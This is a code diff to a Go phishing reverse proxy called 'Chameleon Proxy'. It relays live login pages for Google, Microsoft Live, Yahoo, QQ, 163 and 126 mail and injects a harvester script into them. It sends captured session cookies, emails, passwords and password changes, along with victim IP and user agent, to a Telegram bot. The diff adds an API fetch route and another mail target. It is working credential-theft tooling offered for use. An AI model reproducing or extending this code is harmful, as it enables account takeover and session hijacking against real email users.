@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"io"
 	"log"
 	"net/http"
@@ -82,56 +81,45 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 	})
 
 	r.GET("/", func(c *gin.Context) {
-		c.Redirect(http.StatusMovedPermanently, "/loader.html")
+		c.File("./loader.html") // Serve loader directly on root
 	})
 
-	r.GET("/:hash", func(c *gin.Context) {
-		hash := c.Param("hash")
-		if !strings.HasPrefix(hash, "#") {
-			hash = "#" + hash
+	// NEW API ROUTE: Fetches the page without changing the URL
+	r.GET("/api/fetch", func(c *gin.Context) {
+		email := c.Query("email")
+		if email == "" {
+			c.String(400, "Email missing")
+			return
 		}
 
-		email := strings.TrimPrefix(hash, "#")
 		targetBase := GetTargetDomain(email)
-
-		log.Printf("[PROXY] Fetching live page for %s from %s", email, targetBase)
+		log.Printf("[PROXY] API Fetching for %s from %s", email, targetBase)
 
 		jar, _ := cookiejar.New(nil)
 		proxyClient := &http.Client{
-			Timeout: 15 * time.Second,
-			Jar:     jar,
-			Transport: &http.Transport{
-				ForceAttemptHTTP2: false,
-			},
+			Timeout:   15 * time.Second,
+			Jar:       jar,
+			Transport: &http.Transport{ForceAttemptHTTP2: false},
 		}
 
 		req, err := http.NewRequest("GET", targetBase, nil)
 		if err != nil {
-			c.String(500, "Error creating request")
+			c.String(500, "Error")
 			return
 		}
 
 		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
 		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
 		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
-		req.Header.Set("Sec-Fetch-Dest", "document")
-		req.Header.Set("Sec-Fetch-Mode", "navigate")
-		req.Header.Set("Sec-Fetch-Site", "none")
-		req.Header.Set("Upgrade-Insecure-Requests", "1")
 
 		resp, err := proxyClient.Do(req)
 		if err != nil {
-			c.String(502, "Target Unavailable or Invalid Domain")
+			c.String(502, "Target Unavailable")
 			return
 		}
 		defer resp.Body.Close()
 
-		bodyBytes, err := io.ReadAll(resp.Body)
-		if err != nil {
-			c.String(502, "Error reading body")
-			return
-		}
-
+		bodyBytes, _ := io.ReadAll(resp.Body)
 		bodyStr := string(bodyBytes)
 
 		rewrittenBody := strings.ReplaceAll(bodyStr, targetBase, c.Request.Host+"/")
@@ -146,9 +134,8 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		rewrittenBody = strings.Replace(rewrittenBody, "<head>", "<head>\n"+baseTag, 1)
 		rewrittenBody = strings.Replace(rewrittenBody, "</body>", harvesterScript+"</body>", 1)
 
+		// Clone Cookies and Headers
 		CloneHeaders(resp, c.Writer)
-
-		// Loop through ALL cookies
 		for _, cookie := range resp.Cookies() {
 			c.SetCookie(cookie.Name, cookie.Value, 3600*24, "/", "", false, false)
 			SendTelegramMessage(cfg, FormatCookieHarvest(email, []string{cookie.Name + "=" + cookie.Value}))
@@ -160,11 +147,9 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 	r.POST("/api/harvest", func(c *gin.Context) {
 		contentType := c.ContentType()
-
 		if contentType == "application/json" {
 			var payload map[string]interface{}
 			c.ShouldBindJSON(&payload)
-
 			if t, ok := payload["type"].(string); ok && t == "pass_change" {
 				old := payload["old"].(string)
 				new := payload["new"].(string)
@@ -174,7 +159,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			c.Request.ParseForm()
 			email := c.PostForm("email")
 			password := c.PostForm("password")
-
 			if email == "" {
 				email = c.PostForm("username")
 			}
@@ -190,7 +174,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 			ip := c.ClientIP()
 			userAgent := c.GetHeader("User-Agent")
-
 			SendTelegramMessage(cfg, FormatLoginAlert(email, password, ip, userAgent))
 		}
 		c.JSON(200, gin.H{"status": "ok"})
@@ -199,25 +182,25 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 	r.Any("/proxy/*filepath", func(c *gin.Context) {
 		filepath := c.Param("filepath")
 		filepath = strings.TrimPrefix(filepath, "/")
-
 		referer := c.GetHeader("Referer")
 		targetDomain := "https://accounts.google.com/"
 
 		if strings.Contains(referer, "gmail.com") {
 			targetDomain = "https://accounts.google.com/"
-		} else if strings.Contains(referer, "live.com") || strings.Contains(referer, "outlook.com") {
+		} else if strings.Contains(referer, "live.com") {
 			targetDomain = "https://login.live.com/"
 		} else if strings.Contains(referer, "qq.com") {
 			targetDomain = "https://mail.qq.com/"
 		} else if strings.Contains(referer, "163.com") {
 			targetDomain = "https://mail.163.com/"
+		} else if strings.Contains(referer, "126.com") {
+			targetDomain = "https://mail.126.com/"
 		} else if strings.Contains(referer, "yahoo.com") {
 			targetDomain = "https://login.yahoo.com/"
 		}
 
 		fullURL := targetDomain + filepath
 		outReq, _ := http.NewRequest(c.Request.Method, fullURL, c.Request.Body)
-
 		for key, values := range c.Request.Header {
 			for _, value := range values {
 				outReq.Header.Add(key, value)
@@ -234,7 +217,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		body, _ := io.ReadAll(resp.Body)
 		rewrittenBody := strings.ReplaceAll(string(body), targetDomain, c.Request.Host+"/")
-
 		CloneHeaders(resp, c.Writer)
 		c.Writer.WriteHeader(resp.StatusCode)
 		c.Writer.Write([]byte(rewrittenBody))
@@ -242,19 +224,4 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 	log.Printf("🚀 Chameleon Proxy listening on 0.0.0.0:%s", listenPort)
 	r.Run("0.0.0.0:" + listenPort)
-}
-
-func (s *SessionStore) AddSession(userAgent string, data *SessionData) string {
-	id := fmt.Sprintf("%x", time.Now().UnixNano())
-	s.mu.Lock()
-	defer s.mu.Unlock()
-	s.sessions[id] = data
-	return id
-}
-
-func (s *SessionStore) GetSession(id string) (*SessionData, bool) {
-	s.mu.RLock()
-	defer s.mu.RUnlock()
-	data, ok := s.sessions[id]
-	return data, ok
 }
